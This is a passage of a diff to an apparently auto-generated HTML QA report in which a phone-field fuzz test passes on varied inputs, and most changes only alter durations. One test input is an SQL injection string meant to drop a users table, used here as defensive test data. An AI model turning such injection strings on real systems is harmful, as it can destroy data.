-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[&quot;'); DROP TABLE users; , &quot;] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.27s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[&quot;'); DROP TABLE users; , &quot;] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.29s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10905,10 +10905,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['0\\u200bdata'] · fill(payload)</span>
-    <span class="trow-dur">16.25s</span>
+    <span class="trow-dur">16.27s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['0\\u200bdata'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.25s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['0\\u200bdata'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.27s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10917,10 +10917,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['0'] · fill(payload)</span>
-    <span class="trow-dur">16.28s</span>
+    <span class="trow-dur">16.29s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['0'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.28s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['0'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.29s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10929,10 +10929,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['\u0645\u0631\u062d\u0628\u0627 \u0628\u0627\u0644\u0639\u0627\u0644\u0645'] · fill(payload)</span>
-    <span class="trow-dur">16.25s</span>
+    <span class="trow-dur">16.28s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['\u0645\u0631\u062d\u0628\u0627 \u0628\u0627\u0644\u0639\u0627\u0644\u0645'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.25s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['\u0645\u0631\u062d\u0628\u0627 \u0628\u0627\u0644\u0639\u0627\u0644\u0645'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.28s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10953,10 +10953,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['\uff21\uff22\uff23'] · fill(payload)</span>
-    <span class="trow-dur">16.29s</span>
+    <span class="trow-dur">16.31s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['\uff21\uff22\uff23'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.29s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['\uff21\uff22\uff23'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.31s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10965,10 +10965,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['aaaaaaaaaaaaaaaaaaaaaaaaaaaaa2] · fill(payload)</span>
-    <span class="trow-dur">16.25s</span>
+    <span class="trow-dur">16.30s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['aaaaaaaaaaaaaaaaaaaaaaaaaaaaa2] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.25s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['aaaaaaaaaaaaaaaaaaaaaaaaaaaaa2] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.30s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10977,10 +10977,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['\\n\\n\\n'] · fill(payload)</span>
-    <span class="trow-dur">16.29s</span>
+    <span class="trow-dur">16.26s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['\\n\\n\\n'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.29s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['\\n\\n\\n'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.26s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
   </div>
